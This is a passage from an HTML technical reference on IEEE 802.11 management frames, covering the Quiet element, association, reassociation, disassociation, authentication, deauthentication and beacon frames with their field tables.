<p>Silence periods are scheduled. The <code>Quiet Count</code> field contains the number of <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#beacon-frames">TBTTs</a> before the quiet period is to occur.</p>
<p>Moreover, silence periods may be scheduled periodically. The <code>Quiet Period</code> field indicates the number of <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#beacon-interval">beacon intervals</a> between silence periods. If this field is set to 0, then the silence period is not periodical.</p>
<p>The <code>Quiet Duration</code> field specifies the number of time units that the silence period will last.</p>
<p>The <code>Quiet Offset</code> field is the number of time units after a <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#beacon-interval">beacon interval</a> that the silence period is to begin at.</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-54"><a class="header" href="#introduction-54">Introduction</a></h1>
<p>When 802.11 <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/../Authentication%20&amp;%20Association.html">authentication</a> is complete, the station and AP will move onto to the association phase. The purpose of this exchange is for the station to obtain an Association Identifier (AID). This is achieved by the client sending an <em>Association Request</em> to the AP which then responds with an <em>Association Response</em>.</p>
<p>After the association phase, a second authentication may occur depending on whether a protocol like WPA is set up.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/WiFi_authentication_association.svg" alt="" /></p>
<h2 id="management-frame-fields--information-elements"><a class="header" href="#management-frame-fields--information-elements">Management Frame Fields &amp; Information Elements</a></h2>
<h3 id="listen-interval"><a class="header" href="#listen-interval">Listen Interval</a></h3>
<p>This 2-byte field is sent in Association and Reassociation Request in order to signal to the AP how often a station wakes up in order to listen to beacon management frames. Its value is in beacon interval units - a value of \( n \) indicates that the station wakes up every \( n \) beacons.</p>
<h1 id="association-request"><a class="header" href="#association-request">Association Request</a></h1>
<p>If the <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Authentication%20Frames.html">authentication phase</a> was successful, then the station willing to join the network will issue an <em>association request</em>.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Association_Request.svg" alt="" /></p>
<p>The following elements may be present in an association request:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Order</th><th style="text-align: center">Name</th><th style="text-align: center">Status</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center">1</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#capability-information">Capability Information</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Association%20Frames.html#listen-interval">Listen Interval</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">3</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#ssid">Service Set Identifier (SSID)</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Supported Rates</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">5</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Extended Supported Rates</a></td><td style="text-align: center">Optional</td><td>See Supported Rates.</td></tr>
<tr><td style="text-align: center">6</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#power-capability">Power Capability</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">7</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-channels">Supported Channels</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">8</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#robust-security-network-rsn">RSN</a></td><td style="text-align: center">Optional</td><td>Used with 802.11i.</td></tr>
<tr><td style="text-align: center">9</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#qos-capability">QoS Capability</a></td><td style="text-align: center">Optional</td><td>Used with 802.11e QoS when the EDCA Parameter element is missing.</td></tr>
<tr><td style="text-align: center">10</td><td style="text-align: center">RRM Enabled Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">11</td><td style="text-align: center">Mobility Domain</td><td style="text-align: center">Optional</td><td>Used with 802.11r Fast BSS Transition.</td></tr>
<tr><td style="text-align: center">12</td><td style="text-align: center">Supported Regulatory Classes</td><td style="text-align: center">Optional</td><td>Used with 802.11r.</td></tr>
<tr><td style="text-align: center">13</td><td style="text-align: center">HT Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">14</td><td style="text-align: center">20/40 BSS Coexistence</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">15</td><td style="text-align: center">Extended Capabilities</td><td style="text-align: center">Optional</td><td>See Capability Information.</td></tr>
<tr><td style="text-align: center">Last</td><td style="text-align: center">Vendor-Specific</td><td style="text-align: center">Optional</td><td></td></tr>
</tbody></table>
</div>
<h1 id="association-response"><a class="header" href="#association-response">Association Response</a></h1>
<p>After the association request is acknowledged by the AP, it is examined to verify that its parameters match those of the AP. If differences are found, then the AP must decide whether or not the discrepancy is significant enough to deny association. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Association_Response.svg" alt="" /></p>
<p>If the station can join the network, then the <code>Status Code</code> will contain 0. Otherwise, it will contain the reason for the failure. Additionally, the AP sends its own parameters in the response. A station who is denied association can examine the parameters sent by the AP in the response and try to tweak its own parameters and attempt association anew.</p>
<p>If the association is successful, then the response will contain the association ID for the station. The station can now proceed with sending data or undergoing further authentication. Notwithstanding the 2-byte size of this field, only the 14 less significant bits are used in practice, with the rest of the bits being set to 1. </p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Order</th><th style="text-align: center">Name</th><th style="text-align: center">Status</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center">1</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#capability-information">Capability Information</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#status-code-field">Status Code</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">3</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#ssid">Association ID</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Supported Rates</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">5</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Extended Supported Rates</a></td><td style="text-align: center">Optional</td><td>See Supported Rates.</td></tr>
<tr><td style="text-align: center">6</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#enhanced-distributed-channel-access-edca-parameter">EDCA Parameter</a></td><td style="text-align: center">Optional</td><td>Used with 802.11e QoS when the QoS Capability element is missing.</td></tr>
<tr><td style="text-align: center">7</td><td style="text-align: center">RCPI</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">8</td><td style="text-align: center">RSNI</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">9</td><td style="text-align: center">RRM Enabled Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">10</td><td style="text-align: center">Mobility Domain</td><td style="text-align: center">Optional</td><td>Used with 802.11r. Fast BSS Transition</td></tr>
<tr><td style="text-align: center">11</td><td style="text-align: center">Fast BSS Transition</td><td style="text-align: center">Optional</td><td>Used with 802.11r.</td></tr>
<tr><td style="text-align: center">12</td><td style="text-align: center">DSE Registered Location</td><td style="text-align: center">Optional</td><td>Used with 802.11y.</td></tr>
<tr><td style="text-align: center">13</td><td style="text-align: center">Timeout Interval (Association Comeback Time)</td><td style="text-align: center">Optional</td><td>Used with 802.11w.</td></tr>
<tr><td style="text-align: center">14</td><td style="text-align: center">HT Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">15</td><td style="text-align: center">HT Operation</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">16</td><td style="text-align: center">20/40 BSS Coexistence</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">17</td><td style="text-align: center">Overlapping BSS Scan Parameters</td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">18</td><td style="text-align: center">Extended Capabilities</td><td style="text-align: center">Optional</td><td>See Capability Information.</td></tr>
<tr><td style="text-align: center">Last</td><td style="text-align: center">Vendor-Specific</td><td style="text-align: center">Optional</td><td></td></tr>
</tbody></table>
</div>
<h1 id="reassociation-request"><a class="header" href="#reassociation-request">Reassociation Request</a></h1>
<p>This frame may be sent only from a station to an AP and is used when the station is already connected to the ESS and wishes to connect to another AP within the same ESS. Furthermore, a station may avail itself of this frame when it wants to rejoin the network after it left for a short duration. If the authentication timer has expired, then the station will need to begin anew from the authentication phase and then proceed to issuing a reassociation request. Finally, a station already associated with the network may use a reassociation request in order to tweak some parameters which were exchanged during the original association phase.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Reassociation_Request.svg" alt="" /></p>
<p>The following elements may be present in a reassociation request:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Order</th><th style="text-align: center">Name</th><th style="text-align: center">Status</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center">1</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#capability-information">Capability Information</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Association%20Frames.html#listen-interval">Listen Interval</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">3</td><td style="text-align: center">Current AP MAC Address</td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#ssid">Service Set Identifier (SSID)</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">5</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Supported Rates</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">6</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Extended Supported Rates</a></td><td style="text-align: center">Optional</td><td>See Supported Rates.</td></tr>
<tr><td style="text-align: center">7</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#power-capability">Power Capability</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">8</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-channels">Supported Channels</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">9</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#robust-security-network-rsn">RSN</a></td><td style="text-align: center">Optional</td><td>Used with 802.11i.</td></tr>
<tr><td style="text-align: center">10</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#qos-capability">QoS Capability</a></td><td style="text-align: center">Optional</td><td>Used with 802.11e QoS when the EDCA Parameter element is missing.</td></tr>
<tr><td style="text-align: center">11</td><td style="text-align: center">RRM Enabled Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11k.</td></tr>
<tr><td style="text-align: center">12</td><td style="text-align: center">Mobility Domain</td><td style="text-align: center">Optional</td><td>Used with 802.11r Fast BSS Transition.</td></tr>
<tr><td style="text-align: center">13</td><td style="text-align: center">Fast Transition</td><td style="text-align: center">Optional</td><td>Used with 802.11r.</td></tr>
<tr><td style="text-align: center">14</td><td style="text-align: center">Resource Information Container</td><td style="text-align: center">Optional</td><td>Used with 802.11r.</td></tr>
<tr><td style="text-align: center">15</td><td style="text-align: center">Supported Regulatory Classes</td><td style="text-align: center">Optional</td><td>Used with 802.11r.</td></tr>
<tr><td style="text-align: center">16</td><td style="text-align: center">HT Capabilities</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">17</td><td style="text-align: center">20/40 BSS Coexistence</td><td style="text-align: center">Optional</td><td>Used with 802.11n.</td></tr>
<tr><td style="text-align: center">18</td><td style="text-align: center">Extended Capabilities</td><td style="text-align: center">Optional</td><td>See Capability Information.</td></tr>
<tr><td style="text-align: center">Last</td><td style="text-align: center">Vendor-Specific</td><td style="text-align: center">Optional</td><td></td></tr>
</tbody></table>
</div>
<h1 id="reassociation-response"><a class="header" href="#reassociation-response">Reassociation Response</a></h1>
<p>The response to a reassociation request has the exact same format as the <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Association%20Frames.html#association-response">Association Response Frame</a>.</p>
<h1 id="disassociation-frame"><a class="header" href="#disassociation-frame">Disassociation Frame</a></h1>
<p>Association can be terminated by either side at any time by sending a disassociation frame. A station could send such a frame, for  example, because it leaves the cell to roam to another AP. An AP could send this frame for  example because the station tries to use invalid parameters.</p>
<p>A disassociated station, however, retains its authentication status and may attempt to associate anew without going through the authentication phase.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Deassociation_Frame.svg" alt="" /></p>
<p>The <code>Destination MAC</code> for this type of frame may be the MAC address of the target station/AP, or the broadcast address if the AP needs to disassociate all clients.</p>
<p>A deassociation frame typically contains only a <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#reason-code-field">Reason Code</a> field, although it may be augmented by vendor-specific MFIEs following this reason code. The last element (if present and if it is not the reason code itself) is used with 802.11w.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-55"><a class="header" href="#introduction-55">Introduction</a></h1>
<p>The authentication phase follows the discovery phase. Note that this is not the same authentication phase as the one which establishes encryption in WPA2. The latter is built on top of this system, which in turn only pertains to <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/../Authentication%20&amp;%20Association.html#open-system-authentication">Open System Authentication</a> and <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/../Authentication%20&amp;%20Association.html#shared-key-authentication">Shared-Key Authentication</a>.</p>
<p>The purpose of this phase is to only check and confirm and the station which wants to join the network matches the capabilities required. Shared-Key Authentication was introduced as an extension to this phase in order to enable <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/../Encryption%20&amp;%20Integrity.html#wireless-equivalent-privacy-wep">WEP encryption</a>.</p>
<p>It is paramount to note that if more complex authentication, such as that required by WPA, is used, then OSA is used first and any advanced authentication procedures occur after the association phase.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/802_11_authentication.svg" alt="" /></p>
<h1 id="authentication-frame"><a class="header" href="#authentication-frame">Authentication Frame</a></h1>
<p>The authentication phase avails itself of only a single type of frame which may be used either 2 or 4 times for Open System Authentication and Shared-Key Authentication, respectively. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Authentication_Frame.svg" alt="" /></p>
<p>The <code>Authentication Algorithm Number</code> field value describes which authentication system<br />
is used - 0 for Open System and 1 for Shared-Key.</p>
<p>The <code>Authentication Transaction Sequence Number</code> indicates the stage at which the authentication process is.</p>
<p>The last frame of an authentication exchange bears the ultimate <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#status-code-field">Status Code</a> field. The values 2-9 are reserved and are used when there is no actual status to report (the authentication frame isn't the last in the exchange, e.g. it is an authentication request).</p>
<p>Finally, the <code>Challenge Text</code> element field may or may not be present, depending on the purpose of the authentication frame.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Challenge_Text_MFIE.svg" alt="" /></p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Authentication Algorithm</th><th style="text-align: center">Authentication Transaction Sequence Number</th><th style="text-align: center">Status Code</th><th style="text-align: center">Challenge Text</th></tr></thead><tbody>
<tr><td style="text-align: center">Open System</td><td style="text-align: center">1</td><td style="text-align: center">Reserved</td><td style="text-align: center">Absent</td></tr>
<tr><td style="text-align: center">Open System</td><td style="text-align: center">2</td><td style="text-align: center">Status</td><td style="text-align: center">Absent</td></tr>
<tr><td style="text-align: center">Shared-Key</td><td style="text-align: center">1</td><td style="text-align: center">Reserved</td><td style="text-align: center">Absent</td></tr>
<tr><td style="text-align: center">Shared-Key</td><td style="text-align: center">2</td><td style="text-align: center">Status</td><td style="text-align: center">Present</td></tr>
<tr><td style="text-align: center">Shared-Key</td><td style="text-align: center">3</td><td style="text-align: center">Reserved</td><td style="text-align: center">Present</td></tr>
<tr><td style="text-align: center">Shared-Key</td><td style="text-align: center">4</td><td style="text-align: center">Status</td><td style="text-align: center">Absent</td></tr>
</tbody></table>
</div>
<h1 id="deauthentication-frame"><a class="header" href="#deauthentication-frame">Deauthentication Frame</a></h1>
<p>The AP is also capable of sending a <em>deauthentication frame</em> which terminates all communications between the AP and the station. For example, if a station attempts to send data in the network before being authenticated, then the AP will respond with a deauth frame, signifying that authentication is required first.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Deauthentication_Frame.svg" alt="" /></p>
<p>A deauthentication frame typically contains only a <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#reason-code-field">Reason Code</a> field, although it may be augmented by vendor-specific MFIEs following this reason code. The last element (if present and if it is not the reason code itself) is used with 802.11w.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-56"><a class="header" href="#introduction-56">Introduction</a></h1>
<p>Before connecting to a wireless network, a client needs to be aware of its existence and parameters. This can either be achieved in two ways - passive and active scanning.</p>
<p>Passive scanning is when the client goes through all available channels in turn and listens for beacon frames from the APs in the area. The time spent on each channel is defined by the device's driver.</p>
<p>Active scanning is when the client sends probe requests to each channel in turn in order to discover what networks are available on it.</p>
<h1 id="management-frame-fields--information-elements-1"><a class="header" href="#management-frame-fields--information-elements-1">Management Frame Fields &amp; Information Elements</a></h1>
<p>These are management frame fields and information elements specifically found in discovery management frames - beacon, probe request, and probe response.</p>
<h2 id="frame-fields"><a class="header" href="#frame-fields">Frame Fields</a></h2>
<h3 id="timestamp"><a class="header" href="#timestamp">Timestamp</a></h3>
<p>This is an 8-byte long field which contains the number of μs that the AP has been active. It is used in <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#beacon-frames">beacon</a> and <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#probe-response-frames">probe response</a> frames. Stations avail themselves of this field in order to synchronise their clocks using a Time Synchronising Function (TSF). Should the timestamp exceed its maximum value, it will simply be reset to 0 and the counter would continue, although that would take 580 000 years.</p>
<h3 id="beacon-interval"><a class="header" href="#beacon-interval">Beacon Interval</a></h3>
<p>This 2-byte field represents the interval, in time units (1 TU = 1 kμs = 1 024 μs), between target beacon transmission times (TBTTs). It defaults to 100 TU but small changes may be allowed by certain drivers. It is found in <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#beacon-frames">beacon</a> and <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#probe-response-frames">probe response</a> .</p>
<h2 id="information-elements"><a class="header" href="#information-elements">Information Elements</a></h2>
<h3 id="extended-rate-phy-erp-element"><a class="header" href="#extended-rate-phy-erp-element">Extended Rate PHY (ERP) Element</a></h3>
<p>This element is found only in beacon and probe response frames on 2.4 GHz networks which support 802.11g.</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/ERP_MFIE.svg" alt="" /></p>
<p>This field is essential to the operation of 802.11b/g/n networks.</p>
<p>The <code>Non-EPR Present</code> bit is set to 1 when either of the following criteria are met:</p>
<ul>
<li>A non-ERP station (legacy 802.11 or 802.11b) gets associated with the network.</li>
<li>An adjoining network which only supports non-ERP data rates is detected, typically via a beacon frame from this BSS/IBSS.</li>
<li>A management frame (except for probe requests) is received from an adjoining network which only supports non-ERP data rates.</li>
</ul>
<p>The <code>UseProtection</code> bit is set to 1 as soon as a non-ERP client is associated with the network. It indicates the presence of a station lacking support for 802.11g and signals to ERP clients that the use of a protection mechanism (RTS/CTS or CTS to self) is necessitated before transmission. Within an IBSS, this behaviour is extended to any ERP station receiving a frame from a non-ERP one due to the lack of proper &quot;association&quot;. This bit serves as a warning to other ERP stations to signal the presence of the non-ERP station and should spread to the other ERP stations (they should also set the <code>UseProtection</code> bit to 1 in their frames). It is common nowadays to witness the same procedure within a BSS, although it is not standard behaviour.</p>
<p>The <code>Barker Preamble Mode</code> bit is set to 0 to indicate, when using protection, that short preambles are permitted and is set to 1 when only long preambles should be utilised.</p>
<h2 id="ibss-parameter-set"><a class="header" href="#ibss-parameter-set">IBSS Parameter Set</a></h2>
<p>This element is found in <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#beacon-frames">beacon</a> and <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#probe-response-frames">probe response</a> of stations within an IBSS. </p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/IBSS_Parameter_Set.svg" alt="" /></p>
<p>It contains the Announcement Traffic Indication Message (ATIM) window and indicates the time, in TUs, between ATIM frames in the IBSS.</p>
<h1 id="beacon-frames"><a class="header" href="#beacon-frames">Beacon Frames</a></h1>
<p>Beacon frames are used by APs (and stations in IBSS) in order to announce their presence to the surrounding area and to communicate the parameters of the network. Not only are these frames used by potential clients, but it they also serve the active clients in the network.</p>
<p>Beacon frames are broadcasted periodically at the so-called <em>target beacon transmission time (TBTT)</em>. The interval between beacon transmissions is defined in the AP MIB and defaults to 100 time units, or a little over 102 ms (1 TU = 1 kμs = 1 024 μs). However, the AP will need to delay the transmission if the network is busy.</p>
<p>Beacon frames are used by the stations in a network for time synchronisation. A timestamp as well as the expected transmission time of the next beacon are included in every beacon frame. The timestamp is utilised by each station in the so-called Timing Synchronisation Function (TSF).</p>
<p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Beacon_Frame.svg" alt="" /></p>
<p>Following is a table of the possible fields in a beacon frame (the order for optional fields may vary):</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Order</th><th style="text-align: center">Name</th><th style="text-align: center">Status</th><th>Description</th></tr></thead><tbody>
<tr><td style="text-align: center">1</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#timestamp">Timestamp</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">2</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#beacon-interval">Beacon Interval</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">3</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#capability-information">Capability Information</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">4</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#ssid">Service Set Identifier (SSID)</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">5</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Supported Rates</a></td><td style="text-align: center">Mandatory</td><td></td></tr>
<tr><td style="text-align: center">6</td><td style="text-align: center">Frequency-Hopping (FH) Parameter Set</td><td style="text-align: center">Optional</td><td>Used by legacy FH stations.</td></tr>
<tr><td style="text-align: center">7</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#direct-sequence-ds-parameter-set">DS Parameter Set</a></td><td style="text-align: center">Optional</td><td>Present within beacon frames with stations with clause 15, 18, and 19 as their provenance.</td></tr>
<tr><td style="text-align: center">8</td><td style="text-align: center">CF Parameter Set</td><td style="text-align: center">Optional</td><td>Used for PCF and not present in non-notional situations.</td></tr>
<tr><td style="text-align: center">9</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#ibss-parameter-set">IBSS Parameter Set</a></td><td style="text-align: center">Optional</td><td>Used within an IBSS (duh).</td></tr>
<tr><td style="text-align: center">10</td><td style="text-align: center">Traffic Indication Map (TIM)</td><td style="text-align: center">Optional</td><td>Present only in beacons with an AP as their provenance.</td></tr>
<tr><td style="text-align: center">11</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#country">Country</a></td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">12</td><td style="text-align: center">FH Parameters</td><td style="text-align: center">Optional</td><td>Used with legacy FH stations.</td></tr>
<tr><td style="text-align: center">13</td><td style="text-align: center">FH Pattern Table</td><td style="text-align: center">Optional</td><td>Used with legacy FH stations.</td></tr>
<tr><td style="text-align: center">14</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#power-constraint">Power Constraint</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">15</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#channel-switch-announcement">Channel Switch Announcement</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">16</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#quiet">Quiet</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">17</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#ibss-dsf">IBSS DSF</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h in an IBSS.</td></tr>
<tr><td style="text-align: center">18</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#tpc-report">TPC Report</a></td><td style="text-align: center">Optional</td><td>Used with 802.11h.</td></tr>
<tr><td style="text-align: center">19</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Discovery%20Frames.html#extended-rate-phy-erp-element">ERP Information</a></td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">20</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#supported-rates--extended-supported-rates">Extended Supported Rates</a></td><td style="text-align: center">Optional</td><td>See Supported Rates.</td></tr>
<tr><td style="text-align: center">21</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#robust-security-network-rsn">RSN</a></td><td style="text-align: center">Optional</td><td></td></tr>
<tr><td style="text-align: center">22</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#bss-load">BSS Load</a></td><td style="text-align: center">Optional</td><td>Used with 802.11e QoS.</td></tr>
<tr><td style="text-align: center">23</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#enhanced-distributed-channel-access-edca-parameter">EDCA Parameter</a></td><td style="text-align: center">Optional</td><td>Used with 802.11e QoS when the QoS Capability element is missing.</td></tr>
<tr><td style="text-align: center">24</td><td style="text-align: center"><a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/index.html#qos-capability">QoS Capability</a></td><td style="text-align: center">Optional</td><td>Used with 802.11e QoS when the EDCA Parameter element is missing.</td></tr>
